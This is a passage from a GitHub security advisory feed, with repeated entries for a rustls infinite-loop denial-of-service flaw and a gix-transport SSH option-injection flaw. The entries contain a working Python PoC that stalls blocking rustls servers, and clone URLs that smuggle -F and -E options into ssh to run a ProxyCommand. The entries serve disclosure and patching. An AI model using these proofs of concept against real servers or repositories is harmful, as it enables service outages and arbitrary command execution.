        <id>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</id>
        <link href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj"/>
        <updated>2024-04-23T20:49:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>rustls::ConnectionCommon::complete_io</code> could fall into an infinite loop based on network input.</p>
<h3 id="details">Details</h3>
<p>Verified at <code>0.22</code> and <code>0.23</code> <code>rustls</code>, but <code>0.21</code> and <code>0.20</code> release lines are also affected. <code>tokio-rustls</code> and <code>rustls-ffi</code> do not call <code>complete_io</code> and are not affected. <code>rustls::Stream</code> and <code>rustls::StreamOwned</code> types use <code>complete_io</code> and are affected.</p>
<p>When using a blocking rustls server, if a client send a <code>close_notify</code> message immediately after <code>client_hello</code>, the server's <code>complete_io</code> will get in an infinite loop where:</p>
<ul>
<li><code>eof</code>: false</li>
<li><code>until_handshaked</code>: true</li>
<li><code>self.is_handshaking()</code>: true</li>
<li><code>self.wants_write()</code>: false</li>
<li><code>self.wants_read()</code>: false</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Run simple server: <code>cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key</code></li>
<li>Run following python script<pre><code class="language-python3">#!/usr/bin/env python3

import socket

sock = socket.socket()
sock.connect(("localhost", 4443))

print("Sending client hello...")

# Fake handshake data of a client hello message.
fake_handshake = """
1603 0100 c801 0000 c403 03ec 12dd
1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7
a051 f03c b817 470d 4c54 c5df 7200 001c
eaea c02b c02f c02c c030 cca9 cca8 c013
c014 009c 009d 002f 0035 000a 0100 007f
dada 0000 ff01 0001 0000 0000 1600 1400
0011 7777 772e 7769 6b69 7065 6469 612e
6f72 6700 1700 0000 2300 0000 0d00 1400
1204 0308 0404 0105 0308 0505 0108 0606
0102 0100 0500 0501 0000 0000 0012 0000
0010 000e 000c 0268 3208 6874 7470 2f31
2e31 7550 0000 000b 0002 0100 000a 000a
0008 1a1a 001d 0017 0018 1a1a 0001 00
"""


def parse_fake_handshake():
    i = 0
    data = bytearray()
    while i &lt; len(fake_handshake):
        while i &lt; len(fake_handshake) and fake_handshake[i].isspace():
            i += 1
        if i &gt;= len(fake_handshake):
            return data

        c1 = fake_handshake[i]
        c2 = fake_handshake[i + 1]
        i += 2

        data.append(int(c1, 16) * 16 + int(c2, 16))
    return data


data = parse_fake_handshake()

print("Fake client hello:", data)

sock.send(data)

# Send close_notify alert that we're closing the connection.
close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])
print(f"close_notify is {close_data}")
sock.send(close_data)
print("close_notify sent")

exit(0)
</code></pre>
</li>
<li>You could observe the server process get into 100% cpu usage, and if you add logging at beginning of <code>rustls::conn::ConnectionCommon::complete_io</code>, you could see the function is spinning.</li>
</ol>
<p>Also note that the server thread is stuck in this infinite loop even if the client closes the socket.</p>
<h3 id="impact">Impact</h3>
<p>This is a DOS.</p>
<p>A multithread non-async server that uses <code>rustls</code> could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32650">https://nvd.nist.gov/vuln/detail/CVE-2024-32650</a></li>
<li><a href="https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d">https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d</a></li>
<li><a href="https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af">https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af</a></li>
<li><a href="https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e">https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e</a></li>
<li><a href="https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c">https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c</a></li>
<li><a href="https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e">https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0336.html">https://rustsec.org/advisories/RUSTSEC-2024-0336.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/advisories/GHSA-6g7w-8wpp-frhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-19T19:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustls] Infinite loop in rustls::conn::ConnectionCommon::complete_io() with proper client input]]></title>
        <id>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</id>
        <link href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj"/>
        <updated>2024-04-23T20:49:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>rustls::ConnectionCommon::complete_io</code> could fall into an infinite loop based on network input.</p>
<h3 id="details">Details</h3>
<p>Verified at <code>0.22</code> and <code>0.23</code> <code>rustls</code>, but <code>0.21</code> and <code>0.20</code> release lines are also affected. <code>tokio-rustls</code> and <code>rustls-ffi</code> do not call <code>complete_io</code> and are not affected. <code>rustls::Stream</code> and <code>rustls::StreamOwned</code> types use <code>complete_io</code> and are affected.</p>
<p>When using a blocking rustls server, if a client send a <code>close_notify</code> message immediately after <code>client_hello</code>, the server's <code>complete_io</code> will get in an infinite loop where:</p>
<ul>
<li><code>eof</code>: false</li>
<li><code>until_handshaked</code>: true</li>
<li><code>self.is_handshaking()</code>: true</li>
<li><code>self.wants_write()</code>: false</li>
<li><code>self.wants_read()</code>: false</li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Run simple server: <code>cargo run --bin simpleserver test-ca/rsa/end.fullchain test-ca/rsa/end.key</code></li>
<li>Run following python script<pre><code class="language-python3">#!/usr/bin/env python3

import socket

sock = socket.socket()
sock.connect(("localhost", 4443))

print("Sending client hello...")

# Fake handshake data of a client hello message.
fake_handshake = """
1603 0100 c801 0000 c403 03ec 12dd
1764 a439 fd7e 8c85 46b8 4d1e a06e b3d7
a051 f03c b817 470d 4c54 c5df 7200 001c
eaea c02b c02f c02c c030 cca9 cca8 c013
c014 009c 009d 002f 0035 000a 0100 007f
dada 0000 ff01 0001 0000 0000 1600 1400
0011 7777 772e 7769 6b69 7065 6469 612e
6f72 6700 1700 0000 2300 0000 0d00 1400
1204 0308 0404 0105 0308 0505 0108 0606
0102 0100 0500 0501 0000 0000 0012 0000
0010 000e 000c 0268 3208 6874 7470 2f31
2e31 7550 0000 000b 0002 0100 000a 000a
0008 1a1a 001d 0017 0018 1a1a 0001 00
"""


def parse_fake_handshake():
    i = 0
    data = bytearray()
    while i &lt; len(fake_handshake):
        while i &lt; len(fake_handshake) and fake_handshake[i].isspace():
            i += 1
        if i &gt;= len(fake_handshake):
            return data

        c1 = fake_handshake[i]
        c2 = fake_handshake[i + 1]
        i += 2

        data.append(int(c1, 16) * 16 + int(c2, 16))
    return data


data = parse_fake_handshake()

print("Fake client hello:", data)

sock.send(data)

# Send close_notify alert that we're closing the connection.
close_data = bytearray([0x15, 0x03, 0x03, 0x00, 0x02, 0x01, 0x00])
print(f"close_notify is {close_data}")
sock.send(close_data)
print("close_notify sent")

exit(0)
</code></pre>
</li>
<li>You could observe the server process get into 100% cpu usage, and if you add logging at beginning of <code>rustls::conn::ConnectionCommon::complete_io</code>, you could see the function is spinning.</li>
</ol>
<p>Also note that the server thread is stuck in this infinite loop even if the client closes the socket.</p>
<h3 id="impact">Impact</h3>
<p>This is a DOS.</p>
<p>A multithread non-async server that uses <code>rustls</code> could be attacked by getting few requests like above (each request could cause one thread to spin) and stop handling normal requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/rustls/rustls/security/advisories/GHSA-6g7w-8wpp-frhj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32650">https://nvd.nist.gov/vuln/detail/CVE-2024-32650</a></li>
<li><a href="https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d">https://github.com/rustls/rustls/commit/2123576840aa31043a31b0770e6572136fbe0c2d</a></li>
<li><a href="https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af">https://github.com/rustls/rustls/commit/5374108df698e78c3e9ef8265cac311556be24af</a></li>
<li><a href="https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e">https://github.com/rustls/rustls/commit/6e938bcfe82a9da7a2e1cbf10b928c7eca26426e</a></li>
<li><a href="https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c">https://github.com/rustls/rustls/commit/ebcb4782f23b4edf9b10a7065d9e8d4362439d9c</a></li>
<li><a href="https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e">https://github.com/rustls/rustls/commit/f45664fbded03d833dffd806503d3c8becd1b71e</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0336.html">https://rustsec.org/advisories/RUSTSEC-2024-0336.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6g7w-8wpp-frhj">https://github.com/advisories/GHSA-6g7w-8wpp-frhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6g7w-8wpp-frhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-19T19:46:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide] gix-transport indirect code execution via malicious username]]></title>
        <id>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</id>
        <link href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh"/>
        <updated>2024-04-26T18:51:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>gix-transport</code> does not check the username part of a URL for text that the external <code>ssh</code> program would interpret as an option. A specially crafted clone URL can smuggle options to SSH. The possibilities are syntactically limited, but if a malicious clone URL is used by an application whose current working directory contains a malicious file, arbitrary code execution occurs.</p>
<h3 id="details">Details</h3>
<p>This is related to the patched vulnerability <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, but appears less severe due to a greater attack complexity. Since <a href="https://github.com/Byron/gitoxide/pull/1032">https://github.com/Byron/gitoxide/pull/1032</a>, <code>gix-transport</code> checks the host and path portions of a URL for text that has a <code>-</code> in a position that will cause <code>ssh</code> to interpret part of all of the URL as an option argument. But it does not check the non-mandatory username portion of the URL.</p>
<p>As in Git, when an address is a URL of the form <code>ssh://username@hostname/path</code>, or when it takes the special form <code>username@hostname:dirs/repo</code>, this is treated as an SSH URL. <code>gix-transport</code> will replace some characters in <code>username</code> with their <code>%</code>-based URL encodings, but otherwise passes <code>username@hostname</code> as an argument to the external <code>ssh</code> command. This happens even if <code>username</code> begins with a hyphen. In that case, <code>ssh</code> treats that argument as an option argument, and attempts to interpret and honor it as a sequence of one or more options possibly followed by an operand for the last option.</p>
<p>This is harder to exploit than GHSA-rrjw-j4m2-mf34, because the possibilities are constrained by:</p>
<ul>
<li><p>The difficulty of forming an option argument <code>ssh</code> accepts, given that characters such as <code>=</code>, <code>/</code>, and <code>\</code>, are URL-encoded, <code>:</code> is removed, and the argument passed to <code>ssh</code> contains the <code>@</code> sign and subsequent host identifier, which in an effective attack must be parseable as a suffix of the operand passed to the last option.</p>
<p>The inability to include a literal <code>=</code> prevents the use of <code>-oNAME=VALUE</code> (e.g., <code>-oProxyCommand=payload</code>). The inability to include a literal <code>/</code> or <code>\</code> prevents smuggling in a path operand residing outside the current working directory, incuding on Windows. (Although a <code>~</code> character may be smuggled in, <code>ssh</code> does not perform its own tilde expansion, so it does not form an absolute path.)</p>
</li>
<li><p>The difficulty, or perhaps impossibility, of completing a connection (other than when arbitrary code execution has been achieved). This complicates or altogether prevents the use of options such as <code>-A</code> and <code>-X</code> together with a connection to a real but malicious server. The reason a connection cannot generally be completed when exploiting this vulnerability is that, because the argument <code>gix-transport</code> intends as a URL is treated as an option argument, <code>ssh</code> treats the subsequent non-option argument <code>git-upload-pack</code> as the host instead of the command, but it is not a valid host name.</p>
<p>Although <code>ssh</code> supports aliases for hosts, even if <code>git-upload-pack</code> could be made an alias, that is made difficult by the URL-encoding transformation.</p>
</li>
</ul>
<p>However, an attacker who is able to cause a specially named <code>ssh</code> configuration file to be placed in the current working directory can smuggle in an <code>-F</code> option referencing the file, and this allows arbitrary command execution.</p>
<p>This scenario is especially plausible because programs that operate on git repositories are often run in untrusted git repositories, sometimes even to operate on another repository. Situations where this is likely, such that an attacker could predict or arrange it, may for some applications include a malicious repository with a malicious submodule configuration.</p>
<p>Other avenues of exploitation exist, but appear to be less severe. For example, the <code>-E</code> option can be smuggled to create or append to a file in the current directory (or its target, if it is a symlink). There may also be other significant ways to exploit this that have not yet been discovered, or that would arise with new options in future versions of <code>ssh</code>.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the known case that facilitates arbitrary code execution, first create a file in the current directory named <code>configfile@example.com</code>, of the form</p>
<pre><code class="language-text">ProxyCommand payload
</code></pre>
<p>where <code>payload</code> is a command with an observable side effect. On Unix-like systems, this could be <code>date | tee vulnerable</code> or an <code>xdg-open</code>, <code>open</code>, or other command command to launch a graphical application. On Windows, this could be the name of a graphical application already in the search path, such as <code>calc.exe</code>.</p>
<p>(Although the syntax permitted in the value of <code>ProxyCommand</code> may vary by platform, this is not limited to running commands in the current directory. That limitation only applies to paths directly smuggled in the username, not to the contents of a separate malicious configuration file. Arbitrary other settings may be specified in <code>configfile@example.com</code> as well.)</p>
<p>Then run:</p>
<pre><code class="language-sh">gix clone 'ssh://-Fconfigfile@example.com/abc'
</code></pre>
<p>Or:</p>
<pre><code class="language-sh">gix clone -- '-Fconfigfile@example.com:abc/def'
</code></pre>
<p>(The <code>--</code> is required to ensure that <code>gix</code> is really passing the argument as a URL for use in <code>gix-transport</code>, rather than interpreting it as an option itself, which would not necessarily be a vulnerability.)</p>
<p>In either case, the payload specified in <code>configfile@example.com</code> runs, and its side effect can be observed.</p>
<p>Other cases may likewise be produced, in either of the above two forms of SSH addresses. For example, to create or append to the file <code>errors@example.com</code>, or to create or append to its target if it is a symlink:</p>
<pre><code class="language-sh">gix clone 'ssh://-Eerrors@example.com/abc'
</code></pre>
<pre><code class="language-sh">gix clone -- '-Eerrors@example.com:abc/def'
</code></pre>
<h3 id="impact">Impact</h3>
<p>As in <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, this would typically require user interaction to trigger an attempt to clone or otherwise connect using the malicious URL. Furthermore, known means of exploiting this vulnerability to execute arbitrary commands require further preparatory steps to establish a specially named file in the current directory. The impact is therefore expected to be lesser, though it is difficult to predict it with certainty because it is not known exactly what scenarios will arise when using the <code>gix-transport</code> library.</p>
<p>Users who use applications that make use of <code>gix-transport</code> are potentially vulnerable, especially:</p>
<ul>
<li>On repositories with submodules that are automatically added, depending how the application manages submodules.</li>
<li>When operating on other repositories from inside an untrusted repository.</li>
<li>When reviewing contributions from untrusted developers by checking out a branch from an untrusted fork and performing clones from that location.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0335.html">https://rustsec.org/advisories/RUSTSEC-2024-0335.html</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32884">https://nvd.nist.gov/vuln/detail/CVE-2024-32884</a></li>
<li><a href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/advisories/GHSA-98p4-xjmm-8mfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-15T19:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix] gix-transport indirect code execution via malicious username]]></title>
        <id>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</id>
        <link href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh"/>
        <updated>2024-04-26T18:51:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>gix-transport</code> does not check the username part of a URL for text that the external <code>ssh</code> program would interpret as an option. A specially crafted clone URL can smuggle options to SSH. The possibilities are syntactically limited, but if a malicious clone URL is used by an application whose current working directory contains a malicious file, arbitrary code execution occurs.</p>
<h3 id="details">Details</h3>
<p>This is related to the patched vulnerability <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, but appears less severe due to a greater attack complexity. Since <a href="https://github.com/Byron/gitoxide/pull/1032">https://github.com/Byron/gitoxide/pull/1032</a>, <code>gix-transport</code> checks the host and path portions of a URL for text that has a <code>-</code> in a position that will cause <code>ssh</code> to interpret part of all of the URL as an option argument. But it does not check the non-mandatory username portion of the URL.</p>
<p>As in Git, when an address is a URL of the form <code>ssh://username@hostname/path</code>, or when it takes the special form <code>username@hostname:dirs/repo</code>, this is treated as an SSH URL. <code>gix-transport</code> will replace some characters in <code>username</code> with their <code>%</code>-based URL encodings, but otherwise passes <code>username@hostname</code> as an argument to the external <code>ssh</code> command. This happens even if <code>username</code> begins with a hyphen. In that case, <code>ssh</code> treats that argument as an option argument, and attempts to interpret and honor it as a sequence of one or more options possibly followed by an operand for the last option.</p>
<p>This is harder to exploit than GHSA-rrjw-j4m2-mf34, because the possibilities are constrained by:</p>
<ul>
<li><p>The difficulty of forming an option argument <code>ssh</code> accepts, given that characters such as <code>=</code>, <code>/</code>, and <code>\</code>, are URL-encoded, <code>:</code> is removed, and the argument passed to <code>ssh</code> contains the <code>@</code> sign and subsequent host identifier, which in an effective attack must be parseable as a suffix of the operand passed to the last option.</p>
<p>The inability to include a literal <code>=</code> prevents the use of <code>-oNAME=VALUE</code> (e.g., <code>-oProxyCommand=payload</code>). The inability to include a literal <code>/</code> or <code>\</code> prevents smuggling in a path operand residing outside the current working directory, incuding on Windows. (Although a <code>~</code> character may be smuggled in, <code>ssh</code> does not perform its own tilde expansion, so it does not form an absolute path.)</p>
</li>
<li><p>The difficulty, or perhaps impossibility, of completing a connection (other than when arbitrary code execution has been achieved). This complicates or altogether prevents the use of options such as <code>-A</code> and <code>-X</code> together with a connection to a real but malicious server. The reason a connection cannot generally be completed when exploiting this vulnerability is that, because the argument <code>gix-transport</code> intends as a URL is treated as an option argument, <code>ssh</code> treats the subsequent non-option argument <code>git-upload-pack</code> as the host instead of the command, but it is not a valid host name.</p>
<p>Although <code>ssh</code> supports aliases for hosts, even if <code>git-upload-pack</code> could be made an alias, that is made difficult by the URL-encoding transformation.</p>
</li>
</ul>
<p>However, an attacker who is able to cause a specially named <code>ssh</code> configuration file to be placed in the current working directory can smuggle in an <code>-F</code> option referencing the file, and this allows arbitrary command execution.</p>
<p>This scenario is especially plausible because programs that operate on git repositories are often run in untrusted git repositories, sometimes even to operate on another repository. Situations where this is likely, such that an attacker could predict or arrange it, may for some applications include a malicious repository with a malicious submodule configuration.</p>
<p>Other avenues of exploitation exist, but appear to be less severe. For example, the <code>-E</code> option can be smuggled to create or append to a file in the current directory (or its target, if it is a symlink). There may also be other significant ways to exploit this that have not yet been discovered, or that would arise with new options in future versions of <code>ssh</code>.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the known case that facilitates arbitrary code execution, first create a file in the current directory named <code>configfile@example.com</code>, of the form</p>
<pre><code class="language-text">ProxyCommand payload
</code></pre>
<p>where <code>payload</code> is a command with an observable side effect. On Unix-like systems, this could be <code>date | tee vulnerable</code> or an <code>xdg-open</code>, <code>open</code>, or other command command to launch a graphical application. On Windows, this could be the name of a graphical application already in the search path, such as <code>calc.exe</code>.</p>
<p>(Although the syntax permitted in the value of <code>ProxyCommand</code> may vary by platform, this is not limited to running commands in the current directory. That limitation only applies to paths directly smuggled in the username, not to the contents of a separate malicious configuration file. Arbitrary other settings may be specified in <code>configfile@example.com</code> as well.)</p>
<p>Then run:</p>
<pre><code class="language-sh">gix clone 'ssh://-Fconfigfile@example.com/abc'
</code></pre>
<p>Or:</p>
<pre><code class="language-sh">gix clone -- '-Fconfigfile@example.com:abc/def'
</code></pre>
<p>(The <code>--</code> is required to ensure that <code>gix</code> is really passing the argument as a URL for use in <code>gix-transport</code>, rather than interpreting it as an option itself, which would not necessarily be a vulnerability.)</p>
<p>In either case, the payload specified in <code>configfile@example.com</code> runs, and its side effect can be observed.</p>
<p>Other cases may likewise be produced, in either of the above two forms of SSH addresses. For example, to create or append to the file <code>errors@example.com</code>, or to create or append to its target if it is a symlink:</p>
<pre><code class="language-sh">gix clone 'ssh://-Eerrors@example.com/abc'
</code></pre>
<pre><code class="language-sh">gix clone -- '-Eerrors@example.com:abc/def'
</code></pre>
<h3 id="impact">Impact</h3>
<p>As in <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, this would typically require user interaction to trigger an attempt to clone or otherwise connect using the malicious URL. Furthermore, known means of exploiting this vulnerability to execute arbitrary commands require further preparatory steps to establish a specially named file in the current directory. The impact is therefore expected to be lesser, though it is difficult to predict it with certainty because it is not known exactly what scenarios will arise when using the <code>gix-transport</code> library.</p>
<p>Users who use applications that make use of <code>gix-transport</code> are potentially vulnerable, especially:</p>
<ul>
<li>On repositories with submodules that are automatically added, depending how the application manages submodules.</li>
<li>When operating on other repositories from inside an untrusted repository.</li>
<li>When reviewing contributions from untrusted developers by checking out a branch from an untrusted fork and performing clones from that location.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0335.html">https://rustsec.org/advisories/RUSTSEC-2024-0335.html</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32884">https://nvd.nist.gov/vuln/detail/CVE-2024-32884</a></li>
<li><a href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/advisories/GHSA-98p4-xjmm-8mfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-15T19:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-transport] gix-transport indirect code execution via malicious username]]></title>
        <id>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</id>
        <link href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh"/>
        <updated>2024-04-26T18:51:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>gix-transport</code> does not check the username part of a URL for text that the external <code>ssh</code> program would interpret as an option. A specially crafted clone URL can smuggle options to SSH. The possibilities are syntactically limited, but if a malicious clone URL is used by an application whose current working directory contains a malicious file, arbitrary code execution occurs.</p>
<h3 id="details">Details</h3>
<p>This is related to the patched vulnerability <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, but appears less severe due to a greater attack complexity. Since <a href="https://github.com/Byron/gitoxide/pull/1032">https://github.com/Byron/gitoxide/pull/1032</a>, <code>gix-transport</code> checks the host and path portions of a URL for text that has a <code>-</code> in a position that will cause <code>ssh</code> to interpret part of all of the URL as an option argument. But it does not check the non-mandatory username portion of the URL.</p>
<p>As in Git, when an address is a URL of the form <code>ssh://username@hostname/path</code>, or when it takes the special form <code>username@hostname:dirs/repo</code>, this is treated as an SSH URL. <code>gix-transport</code> will replace some characters in <code>username</code> with their <code>%</code>-based URL encodings, but otherwise passes <code>username@hostname</code> as an argument to the external <code>ssh</code> command. This happens even if <code>username</code> begins with a hyphen. In that case, <code>ssh</code> treats that argument as an option argument, and attempts to interpret and honor it as a sequence of one or more options possibly followed by an operand for the last option.</p>
<p>This is harder to exploit than GHSA-rrjw-j4m2-mf34, because the possibilities are constrained by:</p>
<ul>
<li><p>The difficulty of forming an option argument <code>ssh</code> accepts, given that characters such as <code>=</code>, <code>/</code>, and <code>\</code>, are URL-encoded, <code>:</code> is removed, and the argument passed to <code>ssh</code> contains the <code>@</code> sign and subsequent host identifier, which in an effective attack must be parseable as a suffix of the operand passed to the last option.</p>
<p>The inability to include a literal <code>=</code> prevents the use of <code>-oNAME=VALUE</code> (e.g., <code>-oProxyCommand=payload</code>). The inability to include a literal <code>/</code> or <code>\</code> prevents smuggling in a path operand residing outside the current working directory, incuding on Windows. (Although a <code>~</code> character may be smuggled in, <code>ssh</code> does not perform its own tilde expansion, so it does not form an absolute path.)</p>
</li>
<li><p>The difficulty, or perhaps impossibility, of completing a connection (other than when arbitrary code execution has been achieved). This complicates or altogether prevents the use of options such as <code>-A</code> and <code>-X</code> together with a connection to a real but malicious server. The reason a connection cannot generally be completed when exploiting this vulnerability is that, because the argument <code>gix-transport</code> intends as a URL is treated as an option argument, <code>ssh</code> treats the subsequent non-option argument <code>git-upload-pack</code> as the host instead of the command, but it is not a valid host name.</p>
<p>Although <code>ssh</code> supports aliases for hosts, even if <code>git-upload-pack</code> could be made an alias, that is made difficult by the URL-encoding transformation.</p>
</li>
</ul>
<p>However, an attacker who is able to cause a specially named <code>ssh</code> configuration file to be placed in the current working directory can smuggle in an <code>-F</code> option referencing the file, and this allows arbitrary command execution.</p>
<p>This scenario is especially plausible because programs that operate on git repositories are often run in untrusted git repositories, sometimes even to operate on another repository. Situations where this is likely, such that an attacker could predict or arrange it, may for some applications include a malicious repository with a malicious submodule configuration.</p>
<p>Other avenues of exploitation exist, but appear to be less severe. For example, the <code>-E</code> option can be smuggled to create or append to a file in the current directory (or its target, if it is a symlink). There may also be other significant ways to exploit this that have not yet been discovered, or that would arise with new options in future versions of <code>ssh</code>.</p>
<h3 id="poc">PoC</h3>
<p>To reproduce the known case that facilitates arbitrary code execution, first create a file in the current directory named <code>configfile@example.com</code>, of the form</p>
<pre><code class="language-text">ProxyCommand payload
</code></pre>
<p>where <code>payload</code> is a command with an observable side effect. On Unix-like systems, this could be <code>date | tee vulnerable</code> or an <code>xdg-open</code>, <code>open</code>, or other command command to launch a graphical application. On Windows, this could be the name of a graphical application already in the search path, such as <code>calc.exe</code>.</p>
<p>(Although the syntax permitted in the value of <code>ProxyCommand</code> may vary by platform, this is not limited to running commands in the current directory. That limitation only applies to paths directly smuggled in the username, not to the contents of a separate malicious configuration file. Arbitrary other settings may be specified in <code>configfile@example.com</code> as well.)</p>
<p>Then run:</p>
<pre><code class="language-sh">gix clone 'ssh://-Fconfigfile@example.com/abc'
</code></pre>
<p>Or:</p>
<pre><code class="language-sh">gix clone -- '-Fconfigfile@example.com:abc/def'
</code></pre>
<p>(The <code>--</code> is required to ensure that <code>gix</code> is really passing the argument as a URL for use in <code>gix-transport</code>, rather than interpreting it as an option itself, which would not necessarily be a vulnerability.)</p>
<p>In either case, the payload specified in <code>configfile@example.com</code> runs, and its side effect can be observed.</p>
<p>Other cases may likewise be produced, in either of the above two forms of SSH addresses. For example, to create or append to the file <code>errors@example.com</code>, or to create or append to its target if it is a symlink:</p>
<pre><code class="language-sh">gix clone 'ssh://-Eerrors@example.com/abc'
</code></pre>
<pre><code class="language-sh">gix clone -- '-Eerrors@example.com:abc/def'
</code></pre>
<h3 id="impact">Impact</h3>
<p>As in <a href="https://github.com/advisories/GHSA-rrjw-j4m2-mf34">https://github.com/advisories/GHSA-rrjw-j4m2-mf34</a>, this would typically require user interaction to trigger an attempt to clone or otherwise connect using the malicious URL. Furthermore, known means of exploiting this vulnerability to execute arbitrary commands require further preparatory steps to establish a specially named file in the current directory. The impact is therefore expected to be lesser, though it is difficult to predict it with certainty because it is not known exactly what scenarios will arise when using the <code>gix-transport</code> library.</p>
<p>Users who use applications that make use of <code>gix-transport</code> are potentially vulnerable, especially:</p>
<ul>
<li>On repositories with submodules that are automatically added, depending how the application manages submodules.</li>
<li>When operating on other repositories from inside an untrusted repository.</li>
<li>When reviewing contributions from untrusted developers by checking out a branch from an untrusted fork and performing clones from that location.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/Byron/gitoxide/security/advisories/GHSA-98p4-xjmm-8mfh</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0335.html">https://rustsec.org/advisories/RUSTSEC-2024-0335.html</a></li>
